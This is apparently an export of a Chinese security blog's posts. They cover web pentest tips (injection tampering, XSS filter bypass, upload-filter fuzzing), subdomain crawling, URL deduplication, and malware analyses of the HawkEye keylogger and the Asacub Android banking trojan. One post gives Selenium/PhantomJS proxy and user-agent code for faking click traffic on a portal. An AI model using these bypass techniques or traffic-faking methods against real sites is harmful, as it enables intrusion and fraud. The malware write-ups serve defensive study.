<ul>
  <li>测试敏感点注入时，最好多尝试几遍，加上risk、level、random-ua以及tamper，不要过于依赖扫描器或者fuzz工具。</li>
  <li>测试XSS的时候，最好先用字符试水查看过滤情况，有时候不能直接使用payload的时候，可以尝试绕过。</li>
  <li>上传时可能存在黑/白名单时，每次手动改包会很麻烦。最好是通过字典批量发包进行fuzz。另外，%00不管用时，可以替换成类似的空白字符段（以后补上细节）。</li>
  <li>绕过逻辑改包，无论是上传还是找回密码，记得每步截图，也许有时候只有一次机会。</li>
  <li>修改状态码时，也许能够通过辅助插件，自动化fuzz判断。</li>
  <li>调用callback内容时，其内容也许可控，我们可以尝试往里面注入污染语句。最后，再尝试寻找调用callback的地方。</li>
  <li>找后台一般有几种情况，可以是子目录，也可以是同域名下其他端口，甚至是其他子域名。比如统一SSO登录的情况下，一套网站总会有一个唯一入口。但由于历史的原因，总会遗漏和不统一的地方，那就是我们的突破口。</li>
  <li>待续。</li>
</ul>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[域名采集爬虫]]></title>
      <url>/spider/2017/10/19/domain-spider/</url>
      <content type="html"><![CDATA[<p>
    <span style="color:#00B050;"><strong>
    前段时间在研究扫描器的问题，在涉及域名采集这块时， 突然有了一些特别的想法，所以单独将这个模块提取出来，做成了一套独立系统。
    </strong></span>
</p>

<p>对于域名采集技术，市面上大概有这样几种：</p>

<ul>
  <li>DNS域传送泄露</li>
  <li>接口查询（包括aizhan，shodan等）</li>
  <li>字典枚举</li>
  <li>Github泄露</li>
  <li>搜索引擎泄露</li>
  <li>SSL/TLS证书泄露</li>
  <li>DNS历史记录泄露</li>
  <li>置换扫描枚举法</li>
  <li>互联网自治系统号码(ASN)枚举</li>
  <li>NSEC记录枚举</li>
  <li>互联网项目数据集枚举</li>
</ul>

<p>不过这里要谈的显然不是这种，尽管自研的扫描器里已经集成了前面说的这些，今天的主角是域名采集爬虫。</p>

<p>那么何谓域名采集爬虫呢，其实也是老概念。我们要先从一个URL或者多个URL入口进行爬取。在开始，需要设定好爬行深度和允许爬行的根域名，通过不断地迭代存取和过滤，直到爬取完所有可触及的域名为止。</p>

<p>这样的域名采集方法，较其他技术优势在于：</p>

<ul>
  <li>能采到不被搜索引擎收录的可用域名。</li>
  <li>囊括范围广，除去CDN影响，能更多地去收集目标资产。</li>
  <li>细致入微，在域名采集普及的时代，厂商一般子域名都会多加注意起名，这样做能多收获一些隐藏域名。</li>
  <li>可分布式，相对于普通的单机大字典爆破，可以选择性节省更多的时间。</li>
</ul>

<p>当然讲了这么多，其劣势也很明显：</p>

<ul>
  <li>将耗费更多的时间和各类资源，即使采用了分布式，由于需要考虑部分目标主机的脆弱性，建立的连接数还是有限的。</li>
  <li>容易被封，WAF和各种IDS的规则在检测到爬虫后，可能会直接封禁IP，不过这点可以通过技术手段缓解。</li>
  <li>不易部署，相对于常用的域名接口查询和爆破，这点的劣势还是相当明显的。</li>
  <li>比较鸡肋，没有太多Team会专门为了爬取域名单独建立一个可用的爬虫体系，一般是扫描器只兼容了传统接口。</li>
</ul>

<p>优劣对比还是比较明显的，这里不多做探讨，下面纯技术介绍。</p>

<p>这里的系统采用的是scrapy+django+mongodb，每采集好一批数据后，将存入mongodb，其中的数据包括：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>页面源URL
子域名
根域名

</code></pre>
</div>

<p>后续其他项目将会解析生成的所有子域名，最后再进行资产汇总计算。这些本不属于此项目，不再细说。</p>

<p>另外，在采集过程中，爬虫会在中间件（合规的做法如此，笔者则是直接在爬虫文件里进行的过滤），根据条件过滤重复和不合规的URL。</p>

<p>代码其实很简单，现在已有的是前台查询+后台爬虫（命令行）的形式。后期如果项目可用，会加上前台scrapyd发布任务+MMQ分布式队列缓存。</p>

<p>另外，以后也考虑集成传统接口、泄露查询和枚举模块。</p>

<p>至于为啥现在没有做，因为懒。</p>

<p>代码由于还需要优化，暂时没有放出，以后会补上。</p>

<p>待续。</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[爬虫去重优化]]></title>
      <url>/spider/2017/10/14/url-duplicate-removal/</url>
      <content type="html"><![CDATA[<p>
    <span style="color:#DAA520;"><strong>以前在做漏洞Fuzz爬虫时，曾做过URL去重相关的工作，当时是参考了seay法师的文章以及网上零碎的一些资料，感觉做的很简单。近来又遇到相关问题，于是乎有了再次改进算法的念头。</strong></span>
</p>

<p>首先，针对URL本身的去重，可以直接对整块URL进行处理。在参考网上的一些文章时，发现它们大多做了URL压缩存储。使用这些算法在数据量较大的时候，诚然能大幅减小存储的空间：</p>

<ul>
  <li>
    <p>基于磁盘的顺序存储。</p>
  </li>
  <li>
    <p>基于Hash算法的存储。</p>
  </li>
  <li>
    <p>基于MD5压缩映射的存储。</p>
  </li>
  <li>
    <p>基于嵌入式Berkeley DB的存储。</p>
  </li>
  <li>
    <p>基于布隆过滤器（Bloom Filter）的存储。</p>
  </li>
</ul>

<p>而对于URL逻辑上的去重，这里先给出seay文章中的相似度去重算法，大致是下面这样的：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>def urlsimilar(url):
        hash_size=199999
        tmp=urlparse.urlparse(url)
        scheme=tmp[0]
        netloc=tmp[1]
        path=tmp[2][1:]
        query=tmp[4]
        #First get tail
        if len(path.split('/'))&gt;1:
            tail=path.split('/')[-1].split('.')[-1]
            #print tail
        elif len(path.split('/'))==1:
            tail=path
        else:
            tail='1'
         #Second get path_length
        path_length=len(path.split('/'))-1
        #Third get directy list except last
        path_list=path.split('/')[:-1]+[tail]
        #Fourth hash
        path_value=0
        for i in range(path_length+1):
            if path_length-i==0:
                path_value+=hash(path_list[path_length-i])%98765
            else:
                path_value+=len(path_list[path_length-i])*(10**(i+1))

        #get host hash value
        netloc_value=hash(hashlib.new("md5",netloc).hexdigest())%hash_size
        url_value=hash(hashlib.new("md5",str(path_value+netloc_value)).hexdigest())%hash_size

        return url_value
</code></pre>
</div>
<p>这段函数的大概作用是，最后它会根据算法返回一个hash值，这个hash值也就是该URL的hash相似度。如果两个URL计算出的hash值最后比较相等，我们则可以判断两个URL是具有较高的相似度的。</p>

<p>但是这个函数应该是seay举例时随手提出的（这里强调下，免得被喷，后文不再细说），只是简单做了demo，并没有进行细化检验。在比较粗糙的情况下，该算法确实能剔除一些简单的参数重复的情况，但一旦参数复杂或者url不规范，是不太能很好的进行去重的。</p>

<p>那么在针对URL获取的过程中，我们还可以做的小优化有哪些呢？</p>

<h3 id="日期时间命名">日期时间命名</h3>
<p>首先，我们可以根据日期来去重。我们知道，在爬取一些Blog和和门户等系统时，经常会遇到以日期命名的目录。</p>

<p>这些目录大概归纳起来，存在类似下面的形式：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>
2010-11-11
10-11-11
20101111

</code></pre>
</div>
<p>当然，还有些文件会以时间+随机值命名，也可能是用unix时间戳命名，这些可能是根据上传和编辑时间来定义的。</p>

<p>笔者建议是，使用redis或者memcache之类等缓存型数据库，将其直接存储;或者在数据大的时候，考虑作为临时hash set存储。</p>

<p>比如，一旦出现日期时间命名的目录或静态文件，我们可以将其URL地址作为样本存储在数据库里，存储的内容可以是：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>目录层级
命名格式
URL地址(或hash值)

</code></pre>
</div>
<p>有人可能说，在前面seay提出的那个案例里，好像是可以解决类似日期相似度的问题。那我们先看看下面的例子，此处输出仍然基于上面那个函数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>print urlsimilar('http://www.baidu.com/blog/2010-10-11/')
print urlsimilar('http://www.baidu.com/blog/2010-10-13/')
print urlsimilar('http://www.baidu.com/blog/2010-9-13/')
print urlsimilar('http://www.baidu.com/whisper/2010-10-11/')
</code></pre>
</div>
<p>输出结果如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>110086
110086
37294
4842

</code></pre>
</div>
<p>我们可以看到，在普通情况下，确实于相同父级目录下，相似度算法是可以判断正确的。
但是一旦日期格式不规范，或者父级目录存在一定的差异，这里是不能很好的判断的。</p>

<p>当然，我们也可以通过机器学习来完成去重的工作。不过就简化工作而言，还是可以使用一些小Tips，根据规则匹配来做到。</p>

<h3 id="静态文件的去重">静态文件的去重</h3>

<p>我们知道，在爬取URL的过程中，也会遇到许多静态文件，如shtml、html、css等等。这些文件在大多数的情况下，是没有太大意义的。除非测试者倾向于使用“宁可错杀一百，绝不放过一个”的全量采集手法。</p>

<p>这时候，我们可以配置黑名单，建立文件后缀规则库进行过滤。</p>

<p>当然，在这些静态后缀的URL链接，也可能带上参数混淆的情况。
个人建议是，用于回调的json、xml等URL，里面可能储存敏感内容，尽量别动；其他类型的静态文件，仍然采取将参数分离的方式，最后对URL进行去重存储。</p>

<h3 id="特定情况的过滤">特定情况的过滤</h3>

<p>在爬取特定网站时，我们可以预先做好配置，指定过滤一些目录和页面，以节省大量时间资源。</p>

<p>反过来，我们也可以指定只爬取指定目录下的页面，定向获取我们想要的内容。</p>

<h3 id="敏感页面的感知">敏感页面的感知</h3>

<p>在seay提出的demo算法中，是有一定局限的。比如我们需要在敏感目录下，尽可能多的拿到文件信息。比如我们爬取到了后台管理目录，可能会遇到下面的情况：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>print urlsimilar('http://www.baidu.com/blog/admin/login.php')
print urlsimilar('http://www.baidu.com/blog/admin/manage_index.php')
print urlsimilar('http://www.baidu.com/blog/admin/test.css')

</code></pre>
</div>

<p>输出结果如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>40768
40768
40768
</code></pre>
</div>
<p>很明显有问题不是么？</p>

<p>当然，我们可以通过对敏感页面关键词进行监控；或者也可以指定后缀文件，进行白名单监控。</p>

<p>但是一旦这样做，而且还想采用前面的hash算法的话，大家定义的过滤函数的优先级，肯定需要大于该算法。并且，我们在这样做的过程中，也应该考虑过滤成本的问题，建议采用选择性启用。</p>

<h3 id="高频敏感目录的优待">高频敏感目录的优待</h3>

<p>可能在爬取的过程中，部分爬虫是并用了目录爆破的手段的。如果采用了这种手法并且匹配成功后，我们可以将该目录下的内容单独使用一份过滤规则，从而避免去重算法的误判。</p>

<h3 id="响应页面的过滤">响应页面的过滤</h3>

<p>对于某些网站来讲，可能有不少页面因为链接是失效的，会被冠以404页面和50x错误。另外，在无权访问的时候，可能网站会做30x跳转和403目录限制。</p>

<p>这些页面没有实质性内容，在大多数时候是没有意义的，我们可以在配置文件里对需要爬取的这类页面做白名单，比如保留403页面，或者存取30x跳转前（后）的页面。</p>

<h3 id="waf警告页面过滤">WAF（警告）页面过滤</h3>

<p>某些网站可能被装上了WAF，在访问频率过快时，可能会得到一个WAF的警告页面。而在CMS本身就做了限制的情况下，会以20x的响应码展示一些没有不存在的页面。</p>

<p>当然，我们可以通过分布式换代理的方式，去解决部分这样的问题，这里先不多做讨论。</p>

<p>这时候，我们可以配置相应的次数阈值，如果某些页面出现的次数过多，可以将其标记为警告（WAF）页面，进而做出过滤处理。这里对某页面的识别，可以通过黑名单关键字标记，或者计算页面hash值，比如下面这样：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>content = urllib2.urlopen('http://www.test.com/').read()
md5_sum = hashlib.md5()
md5_sum.update(content)
print md5_sum.hexdigest()
</code></pre>
</div>

<p>当然，我们在实际计算页面hash值和取关键字（做分词或黑名单）时，也可能由于反爬虫机制的存在（如添加随机值），需要适时调整相似度来计算hash值或者采用其他手段。当然这也会消耗更多的时间和机器资源。但某些特定的情况下，可能也会带来意想不到的收获。</p>

<h3 id="无意义参数页面去重">无意义参数页面去重</h3>

<p>我们在采集页面的过程中，同样有可能会遇到一些毫无意义的、高频出现的、多参数页面。这类页面可能是回调页面，也可能是临时渲染的随机页面。</p>

<p>在这里，大家可以通过前面处理WAF（警告）的方法进行过滤。当然，使用前面的hash算法也是可以应对大部分情况的。毕竟网站的这类的URL有限，不必为了几种特型去消耗更多的资源，这样得不偿失。</p>

<h3 id="js代码中的url">JS代码中的URL</h3>

<p>在我们提取js代码，也就是遇到ajax之类的交互情况时，可能会遇到需要拼接的GET请求，或者直接可以取用的POST请求。</p>

<p>这类的URL地址，最好是结合phantomjs等webkit，更方便地进行动态拼接。</p>

<p>它们会显得比较特殊，可能仅仅返回状态码，也可能会返回实质性的敏感内容。这种情况，就需要根据爬取者的要求，对爬取的过滤规则进行适应性调整。</p>

<h3 id="总结">总结</h3>

<p>这里旨在提出一些对相似URL去重的小优化，可能效果有限，也可能存在未尽人意之处。欢迎大家提出建议，诸君共勉。</p>

<h3 id="参考文章">参考文章</h3>

<p>如何避免重复抓取同一个网页
https://segmentfault.com/q/1010000002664904</p>

<p>浅谈动态爬虫与去重
http://bobao.360.cn/learning/detail/3391.html</p>

<p>网络爬虫：URL去重策略之布隆过滤器(BloomFilter)的使用
http://blog.csdn.net/lemon_tree12138/article/details/47973715</p>

<p>实用科普：爬虫技术浅析 编写爬虫应注意的点
http://www.cnseay.com/?p=4102</p>

<p>网络爬虫 (spider) URL消重设计 URL去重设计
http://woshizn.iteye.com/blog/532605</p>
]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[迁移博客]]></title>
      <url>/jekyll/update/start/2017/09/02/welcome-to-jekyll/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>最近原来的空间服务里到期了，钱包吃紧又想diy，最后就选择了转入Github page。</strong></span>
</p>

<p>在转入时遇到了许多坑，尤其是在ruby gem安装时老遇到依赖问题，下载没代理也老卡住。</p>

<p>好不容易弄好后，本来想自己改个简单的主题将就用下。结果又遇到分页和一系列插件配置问题，搞得头都大了。</p>

<p>作为一名老年选手差点崩溃，最后无奈下了个Jekyll主题，稍微改下就全部搞定了。</p>

<p>好吧，以前用CMS差点被人搞，这次全静态，could you tell me how to play with it?</p>

<p>If you can…</p>

<p>Dalao,  ball dai fly…</p>

]]></content>
      <categories>
        
          <category> jekyll </category>
        
          <category> update </category>
        
          <category> start </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Selenium+phantomjs刷量]]></title>
      <url>/spider/2016/11/12/seleniumphantomjs-e5-88-b7-e9-87-8f/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>最近有这方面的需求，要帮人在某网站上刷点击量。由于该网站是一家比较知名的大型门户，反作弊机制肯定是有的，所以突发奇想用Selenium试试。</strong></span>
</p>

<p>
	与Selenium类似的东西有lxml，它们采用正则xpath路径匹配标签会多一些。当然，也有人会使用beautifulsoup4去解析网页结构，最后再得到需要的标签。达成目的的路不止一条，这点不再赘述。
</p>

<p>
	本来想用Selenium随便找个浏览器模拟人的浏览网页行为，结果每次需要重新打开一次浏览器，几乎让人抓狂。最后还是采用了phantomjs，这是一种后台浏览器，同样满足模拟行为。
</p>

<p>
	这里提一下，Selenium需要跟浏览器版本的更新度一致。本来我采用的firefox28.0+Selenium3.01,结果踩了半天坑没找到原因。最后，将火狐更新到最新版47.01才解决。
</p>

<p>
	像这类调度，我发现的大概需要注意的有两点：
</p>

<p>
	第一：他们都需要有个浏览器调用的中间件【windows下举例】：
</p>

<p>
	<span style="color:#FF0000;">比如phantomjs.exe（同类的有chromedriver.exe【谷歌】、geckodriver.exe【火狐】），这些需要放在python环境的script目录下。</span>
</p>

<p>
	第二：浏览器需要装在默认目录：
</p>

<p>
	<span style="color:#FF0000;">当然在浏览器目录添加系统环境变量（PATH）也是可以的，这个不是默认添加的，否则会报错。</span>
</p>

<p>
	<span style="color:#000000;">完成了这些工作以后，我们就可以后台对</span>Selenium进行调度了，另外phantomjs具有JS特性，自然也是可以对后台加载的网页进行一些诸如定位、拖动滚动条之类的操作。
</p>

<p>
	比如下面这段代码片段【案例来自于网络】：
</p>

<pre class="brush:python;">
&nbsp; &nbsp; driver.get(pageURL)&nbsp;
&nbsp; &nbsp; js1 = &#39;return document.body.scrollHeight&#39;
&nbsp; &nbsp; js2 = &#39;window.scrollTo(0, document.body.scrollHeight)&#39;
&nbsp; &nbsp; old_scroll_height = 0
&nbsp; &nbsp; while(driver.execute_script(js1) &gt; old_scroll_height):
&nbsp; &nbsp; &nbsp; &nbsp; old_scroll_height = driver.execute_script(js1)
&nbsp; &nbsp; &nbsp; &nbsp; driver.execute_script(js2)
&nbsp; &nbsp; &nbsp; &nbsp; time.sleep(1) &nbsp;</pre>

<p>
	我们刷流量嘛，自然需要代理。这个可以在网上买，大概5块几千个没问题，不保证稳定性。当然，你去其他免费代理网站爬下来也是可以的。
</p>

<p>
	设置代理的法子大概写一下【案例来自于网络】：
</p>

<pre class="brush:python;">
service_args = [
 &#39;--proxy=127.0.0.1:9999&#39;,
 &#39;--proxy-type=socks5&#39;,
 ]
driver = webdriver.PhantomJS(&#39;../path_to/phantomjs&#39;,service_args=service_args)</pre>

<p>
	UA在放在list池子里，需要的时候自行启用：
</p>

<pre class="brush:python;">
from random import choice</pre>

<p>
	header里设置UA【案例来自于网络】：
</p>

<pre class="brush:python;">
from selenium import webdriver
from selenium.webdriver import DesiredCapabilities
driver=webdriver.PhantomJS(executable_path=&#39;存放路径\phantomjs.exe&#39;)
desired_capabilities= DesiredCapabilities.PHANTOMJS.copy()
headers = {&#39;Accept&#39;: &#39;*/*&#39;,
&#39;Accept-Language&#39;: &#39;en-US,en;q=0.8&#39;,
&#39;Cache-Control&#39;: &#39;max-age=0&#39;,
&#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#39;,#这种修改 UA 也有效
&#39;Connection&#39;: &#39;keep-alive&#39;
&#39;Referer&#39;:&#39;http://www.baidu.com/&#39;
}
for key, value in headers.iteritems():
    desired_capabilities['phantomjs.page.customHeaders.{}'.format(key)] = value
desired_capabilities['phantomjs.page.customHeaders.User-Agent'] = &#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36&#39;
driver= webdriver.PhantomJS(desired_capabilities=desired_capabilities)
driver.get(&quot;http://www.myip.cn/judge.php&quot;)
print driver.page_source</pre>

<p>
	其他涉及具体细节的，这里就不多谈了，网上很多。
</p>

<p>
	我这里也是临时用下，没有太高深的技术。希望对某些朋友有帮助，Good luck!
</p>

<p>
	<strong><span style="color:#FFD700;">[转载请注明来源</span><a href="http://blog.hellsec.net/" target="_blank"><span style="color:#FFD700;">本站</span></a><span style="color:#FFD700;">,谢谢。]</span></strong>
</p>

]]></content>
      <categories>
        
          <category> spider </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[看我如何从邮箱附件的逆向分析到揪出黑客源头]]></title>
      <url>/translate/2016/07/06/e7-9c-8b-e6-88-91-e5-a6-82-e4-bd-95-e4-bb-8e-e9-82-ae-e7-ae-b1-e9-99-84-e4-bb-b6-e7-9a-84-e9-80-86-e5-90-91-e5-88-86-e6-9e-90-e5-88-b0-e6-8f-aa-e5-87-ba-e9-bb-91-e5-ae-a2-e6-ba-90-e5-a4-b4/</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #00B050;">这个故事要从一次垃圾邮件攻击事件说起，下图是一个笔者从某封垃圾邮件里提取的可疑附件。至于下面这蹩脚的英语，这也是值得我们注意的地方。</span></strong></p>

<p>上图的附件使用了“.doc”作为后缀，但它其实是RTF（富文本）格式的文件。该文件包含了一个针对性的RTF栈溢出exp，它利用了CVE-2010-3333，也就是在微软Word RTF解析器在处理pFragments时会产生的一个漏洞。然而，该漏洞在五年前就已经修补了。</p>

<p>正如你在上图中看到的那样，该exp和shellcode做了混淆来逃避杀软的检测。经过各种提取整理解密之后，笔者发现该shellcode会从volafile.io上面下载文件来执行。</p>

<p>下载下来的这个文件是微软.net Win32可执行文件，简单hex dump了这个文件，笔者发现了HawkEyekeylogger字符串。</p>

<p>在谷歌后发现，它指引笔者找到了开发该键盘记录器的官网。在网站里，他们列出了该键盘记录器一些的特性。</p>

<p>在笔者动态的分析中，该键盘记录器会把自身复制一份到Application Data（%appdata%）文件夹，并且将复制后的文件命名为WindowsUpdate.exe。同时，它在注册表里设置了开机启动，以实现其持续性攻击。</p>

<p>并且，它还会在受感染的系统里释放以下文件：</p>

<p><span style="color: #ff6600;">%Temp%\Sysinfo.txt – 释放的恶意软件exe路径</span></p>

<p><span style="color: #ff6600;">%Appdata%\pid.txt –恶意软件进程ID</span></p>

<p><span style="color: #ff6600;">%Appdata%\pidloc.txt – 恶意软件进程exe路径</span></p>

<p>接着，笔者观察到该键盘记录器试图去checkip.dyndns.com，获取受感染系统的外网IP。这个合法的网站经常被恶意软件利用，拿来确定受感染系统的IP地址。</p>

<p>过了一会儿，笔者监控到了SMTP流量，发现了受感染系统发送信息给黑客email的动作。</p>

<p>里面的信息可能包括：</p>

<p><span style="color: #ff6600;">计算机名</span></p>

<p><span style="color: #ff6600;">本地日期和时间</span></p>

<p><span style="color: #ff6600;">系统语言</span></p>

<p><span style="color: #ff6600;">操作系统</span></p>

<p><span style="color: #ff6600;">平台</span></p>

<p><span style="color: #ff6600;">操作系统版本</span></p>

<p><span style="color: #ff6600;">内存</span></p>

<p><span style="color: #ff6600;">.net框架</span></p>

<p><span style="color: #ff6600;">系统权限</span></p>

<p><span style="color: #ff6600;">默认浏览器</span></p>

<p><span style="color: #ff6600;">防火墙</span></p>

<p><span style="color: #ff6600;">内网IP地址</span></p>

<p><span style="color: #ff6600;">外网IP地址</span></p>

<p><span style="color: #ff6600;">恢复邮件设置和密码</span></p>

<p><span style="color: #ff6600;">恢复浏览器和FTP密码</span></p>

<p>正如前面笔者提到的，这款键盘记录器是由.net编译的。所以，笔者接下来需要反编译这个可执行文件。笔者使用了一个开源的.net反编译工具<a href="https://github.com/icsharpcode/ILSpy">ILSpy</a>来完成这个任务。</p>

<p>笔者反编译出了源代码，并将其与官网的特性列表进行比较，结果表明是完全符合的。笔者发现其代码有以下的特点：</p>

<p>一个剪贴板记录器</p>

<p>一个浏览器，FTP和邮件客户端密码记录器。它也会去尝试窃取密码管理器证书和windows密钥。</p>

<p>蠕虫类的USB感染程序，可以让记录器感染扩散到其他windows机器。</p>

<p>它也针对一些Steam游戏平台的用户，通过删除配置和登录数据文件，用户会强制再次登录。这就给了键盘记录器窃取用户Steam认证的可乘之机。</p>

<p>窃取的信息里包括桌面截图，它们会被发送到黑客的邮箱，或者键盘记录器里配好的FTP服务器上。</p>

<p>黑客貌似也会配置键盘记录器，通过HTTP将窃取的信息上传到PHP服务器上。但是奇怪的是，这里的代码留空了。</p>

<p>笔者在反编译时，发现最有趣的是一个C#的构造函数Form1()。这是键盘记录器储存配置的地方，但是为了确保黑客电子邮件地址和FTP登录凭证的安全，它们使用了Rijndael算法和Base64加密。</p>

<p>但是我们知道，这些加密的数据并不一定安全，特别是解密的部分写在了笔者能够反编译的代码里。</p>

<p>下面这张图是Decrypt（解密）方法，它会接收两个字符串参数：encryptedBytes和secretKey。这个安全密钥恰好是硬编码字符串HawkSpySoftwares。</p>

<p>正如提到的那样，该键盘记录器使用了Rijndael算法，安全密钥用了Unicode字符串“099u787978786”进行加盐，也是硬编码。</p>

<p>处于好奇，笔者复制了这部分代码，简单修改适应后，在MS Visual Studio里面去进行编译。当然，最后笔者应该是解密成功了（待验证）。</p>

<p>最后，笔者拿着邮箱认证信息去登陆尝试。</p>

<p>这些似乎是感染系统上的电子邮件地址。所以笔者检查了邮件设置，结果发现了意外之喜！发送到这个邮箱的电子邮件会自动转发到黑客的Gmail账户里。你可以在下面截图里看到黑客的Gmail地址。</p>

<p>也许黑客知道HawkEye容易被破解，所以为了保护他们自己的电子邮件认证信息，就劫持了一个无辜的电子邮件账户作为初始的接收器，最后它会把收到的内容统统转给黑客的真实电子邮件地址。</p>

<p>最终，笔者把受害的电子邮件帐户还给了失主，并为他们修改了密码，移除了黑客的电子邮件重定向设置。</p>

<p>如文中所写的，笔者也收到了包含CVE-2012-0158的exp附件，里面是同一款键盘记录器，但是却配置了另一个电子邮箱账户作为窃取数据的初始接收邮箱。</p>

<p>攻击中的这两个漏洞虽然已经比较早了，但是仍广泛用于电子邮件攻击之中，这里建议读者更新好补丁，使用好相应的杀软，从而防御黑客的攻击。</p>

<p><span style="color: #ff0000;"><strong>[参考来源<a style="color: #ff0000;" href="https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/" target="_blank">trustwave</a>，转载请注明本站翻译]</strong></span></p>
]]></content>
      <categories>
        
          <category> translate </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Asacub：从间谍软件到银行木马]]></title>
      <url>/translate/2016/01/25/asacub-ef-bc-9a-e4-bb-8e-e9-97-b4-e8-b0-8d-e8-bd-af-e4-bb-b6-e5-88-b0-e9-93-b6-e8-a1-8c-e6-9c-a8-e9-a9-ac/</url>
      <content type="html"><![CDATA[<p><span style="color: #00B050;"><strong>我们最近分析了一个系列银行木马Trojan-Banker.AndroidOS.Asacub，发现了其中在用的一台CC服务器chugumshimusona.com，也在为一款名为CoreBot的Windows木马所使用,这让我们起了对这款移动端银行木马进行分析的心思。</strong></span></p>

<!--more-->
<p>据我们所知，最初版本的Asacub木马出现在2015年6月。与其说当时的Asacub是银行恶意软件，不如说它是一款木马。早期的Asacub会窃取用户收到的所有短信，并上传到黑客的服务器。这款木马能够从CC服务器接收和处理下面的命令：
<span style="color: #ffcc99;">get_history: 将浏览器历史上传到服务器上。</span>
<span style="color: #ffcc99;"> get_contacts: 将联系人列表上传到服务器上。</span>
<span style="color: #ffcc99;"> get_listapp: 将安装的应用列表上传到服务器上。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> send_sms: 发送带有指定内容的短信到指定号码。</span>
而新版本的Asacub出现在2015年7月，这款恶意软件在接口使用了欧洲银行的logo，取代了早期版本的美国银行的logo。
与此同时，它可以执行的命令数量也有了很大的增长：
<span style="color: #ffcc99;">get_sms: 将所有短信上传到服务器上。</span>
<span style="color: #ffcc99;"> del_sms: 删掉指定的短信。</span>
<span style="color: #ffcc99;"> set_time: 为CC服务器的联系设定新的时间间隔。</span>
<span style="color: #ffcc99;"> get_time: 指定CC目标与CC服务器联系的时间间隔。</span>
<span style="color: #ffcc99;"> mute_vol: 静默电话模式。</span>
<span style="color: #ffcc99;"> start_alarm: 启用设备白屏处理器继续运行模式。</span>
<span style="color: #ffcc99;"> stop_alarm: 禁用设备白屏处理器继续运行模式。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> rev_shell: 反弹shell执行命令。</span>
<span style="color: #ffcc99;"> intercept_start: 启用短信拦截。</span>
<span style="color: #ffcc99;"> intercept_stop: 关闭短信拦截。</span>
上述的远程命令执行（反弹shell）功能，其实对这类恶意软件的来讲是不太正常的。在接收到命令后，木马会主动将远程服务器接入肉鸡设备的控制台，以便黑客在设备上执行命令和获取输出的结果。这个功能是典型的后门功能，我们其实很少发现银行类恶意软件会使用它。因为大多数银行类恶意软件，旨在从受害者银行账户里窃取资金，而不是控制设备本身。
最新版本的Asacub出现在2015年9月之后，这里的功能比起早期版本来更加关注窃取银行的敏感信息。早期版本只是使用了银行的logo图标，新版本中我们则发现了一些带着银行logo的钓鱼页面：</p>

<p><img class="alignnone" src="https://cdn.securelist.com/files/2016/01/blog_corebot_1nn-768x698.jpg" alt="" width="768" height="698" /></p>

<p>该木马名叫“ActivityVTB24”。这听起来似乎是一家俄罗斯的大型银行，但是其却自称为乌克兰银行。</p>

<p><img class="alignnone" src="https://cdn.securelist.com/files/2015/12/blog_corebot_2-768x683.jpg" alt="" width="768" height="683" />
自去年9月Asacub改版以来，钓鱼窗口出现在所有变种之中，但是其中只有银行卡的输入框可用。这意味着黑客可能只攻击他们所使用银行的客户，当然也可能这只是其中一个版本。
在启动后，“秋日版本（autumnal version）”的木马就开始窃取短信，并且还能执行下面的命令：
<span style="color: #ffcc99;">get_history: 上传浏览器历史记录到服务器上。</span>
<span style="color: #ffcc99;"> get_contacts: 上传联系人列表到服务器上。</span>
<span style="color: #ffcc99;"> get_cc: 弹出钓鱼窗口来窃取银行卡数据。</span>
<span style="color: #ffcc99;"> get_listapp: 上传已安装程序列表到服务器。</span>
<span style="color: #ffcc99;"> change_redir: 转发所有来电到指定手机号码。</span>
<span style="color: #ffcc99;"> block_phone: 锁屏。</span>
<span style="color: #ffcc99;"> send_ussd: 运行指定的USSD请求。</span>
<span style="color: #ffcc99;"> update:下载指定的文件并安装。</span>
<span style="color: #ffcc99;"> send_sms: 短信发送指定内容到指定号码。</span>
虽然目前我们并没有注意到有美国用户受到它的攻击，但是黑客对美国银行logo的使用应该是个危险的信号。该木马正在迅速发展，随时有新的特性可能会激活，然后添加进木马里。
<strong><span style="color: #ff0000;">今天的Asacub</span></strong>
2015年末，我们发现了一个新的Asacub，它增添了下面的命令：
<span style="color: #ffcc99;">GPS_track_current – 获取设备的坐标定位，发送给攻击者。</span>
<span style="color: #ffcc99;"> camera_shot – 使用设备的相机拍照。</span>
<span style="color: #ffcc99;"> network_protocol – 目前我们不知道它有任何用处，但应该在未来会和CC服务器产生交互。</span>
这些变种里没有钓鱼功能，但代码中涉及到了银行关键词。有意思的是，该木马一直试图关闭乌克兰银行的官方应用：
